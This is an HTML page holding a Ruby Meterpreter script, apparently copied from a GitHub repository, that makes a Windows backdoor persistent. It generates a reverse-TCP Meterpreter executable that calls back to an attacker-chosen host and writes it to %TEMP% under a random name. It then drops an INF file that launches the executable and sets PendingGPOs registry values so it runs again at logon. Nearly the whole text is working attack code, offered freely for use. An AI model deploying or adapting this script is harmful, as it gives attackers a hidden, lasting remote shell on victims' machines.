<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Pending GPO And INF</title>
</head><body>#https://github.com/naxonez/scripts/blob/master/persistenceGPO.rb<br/>
#####################################################<br/>
## &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Created by @NaxoneZ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ##<br/>
#####################################################<br/>
# Copiar, cambiar, hacer lo que quer√°is.. ITS FREE! #<br/>
#####################################################<br/>
## &nbsp; &nbsp; &nbsp; &nbsp; Script Persistencia PendingGPOs &nbsp; &nbsp; &nbsp; &nbsp; ##<br/>
#####################################################<br/>
<br/>
<br/>
#Default parameters for payload<br/>
#-------------------------------------------------------------------------------<br/>
rhost = Rex::Socket.source_address("1.2.3.4")<br/>
rport = 4444<br/>
payload_type = "windows/meterpreter/reverse_tcp"<br/>
<br/>
<br/>
#Parameters<br/>
#-------------------------------------------------------------------------------<br/>
@exec_opts = Rex::Parser::Arguments.new(<br/>
&nbsp; "-h" &nbsp;=&gt; [ false, &nbsp;"This help menu"],<br/>
&nbsp; "-r" &nbsp;=&gt; [ true, &nbsp; "The IP of the system running Metasploit listening for the connect back"],<br/>
&nbsp; "-p" &nbsp;=&gt; [ true, &nbsp; "The port on which the system running Metasploit is listening"],<br/>
)<br/>
<br/>
<br/>
# Usage Message Function<br/>
#-------------------------------------------------------------------------------<br/>
def usage<br/>
&nbsp; print_line "Meterpreter Script modified for creating a persistent backdoor on a target host using PendingGPOs."<br/>
&nbsp; print_line(@exec_opts.usage)<br/>
&nbsp; raise Rex::Script::Completed<br/>
end<br/>
<br/>
#Default parameters for files<br/>
#-------------------------------------------------------------------------------<br/>
pathFile = @client.fs.file.expand_path("%TEMP%")<br/>
infName = Rex::Text.rand_text_alpha((rand(8)+6)) + ".inf"<br/>
exeName = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"<br/>
serviceName = Rex::Text.rand_text_alpha((rand(10)+6))<br/>
infFile = pathFile + "\\" + infName<br/>
exeFile = pathFile + "\\" + exeName<br/>
<br/>
#==============================================================================#<br/>
#==============================================================================#<br/>
<br/>
# Function for Creating the Payload<br/>
#-------------------------------------------------------------------------------<br/>
def create_payload(payload_type,lhost,lport)<br/>
&nbsp; print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")<br/>
&nbsp; payload = payload_type<br/>
&nbsp; pay = client.framework.payloads.create(payload)<br/>
&nbsp; pay.datastore['LHOST'] = lhost<br/>
&nbsp; pay.datastore['LPORT'] = lport<br/>
&nbsp; return pay.generate<br/>
end<br/>
<br/>
<br/>
# Function to install payload in to the registry HKLM or HKCU<br/>
#-------------------------------------------------------------------------------<br/>
def write_to_reg(script_on_target)<br/>
&nbsp; key_path = "HKCU\\Software\\Microsoft\\IEAK\\GroupPolicy\\PendingGPOs"<br/>
&nbsp; registry_createkey(key_path)<br/>
&nbsp; registry_setvaldata("#{key_path}", "Path1", script_on_target, "REG_SZ")<br/>
&nbsp; registry_setvaldata("#{key_path}", "Section1", "DefaultInstall", "REG_SZ")<br/>
&nbsp; registry_setvaldata("#{key_path}", "Count", "1", "REG_DWORD")<br/>
&nbsp; print_good("Installed into autorun as #{key_path}")<br/>
end<br/>
<br/>
# Function for writing script to target host<br/>
#-------------------------------------------------------------------------------<br/>
def write_script_to_target(file, contentFile)<br/>
&nbsp; fd = @client.fs.file.new(file, "wb")<br/>
&nbsp; fd.write(contentFile)<br/>
&nbsp; fd.close<br/>
&nbsp; print_good("Persistent Script written to #{file}")<br/>
end<br/>
<br/>
#==============================================================================#<br/>
#==============================================================================#<br/>
<br/>
# Main<br/>
#-------------------------------------------------------------------------------<br/>
@exec_opts.parse(args) { |opt, idx, val|<br/>
case opt<br/>
&nbsp; when "-h"<br/>
&nbsp; &nbsp; usage<br/>
&nbsp; when "-r"<br/>
&nbsp; &nbsp; rhost = val<br/>
&nbsp; when "-p"<br/>
&nbsp; &nbsp; rport = val.to_i<br/>
end<br/>
}<br/>
<br/>
# call for writing executable with payload in system<br/>
#-------------------------------------------------------------------------------<br/>
write_script_to_target(exeFile,::Msf::Util::EXE.to_win32pe(client.framework,create_payload(payload_type, rhost, rport)))<br/>
<br/>
# call for writing inf<br/>
#-------------------------------------------------------------------------------<br/>
write_script_to_target(infFile,"[Version]\r\nsignature = '$CHICAGO$'\r\nAdvancedINF = 2.5,'Persistence for All!'\r\n[DefaultInstall]\r\nRunPreSetupCommands = "+ serviceName +":2\r\n["+ serviceName +"]\r\n" + exeFile)<br/>
<br/>
# call for writing registry<br/>
#-------------------------------------------------------------------------------<br/>
write_to_reg(pathFile + "\\" + infName)</body></html>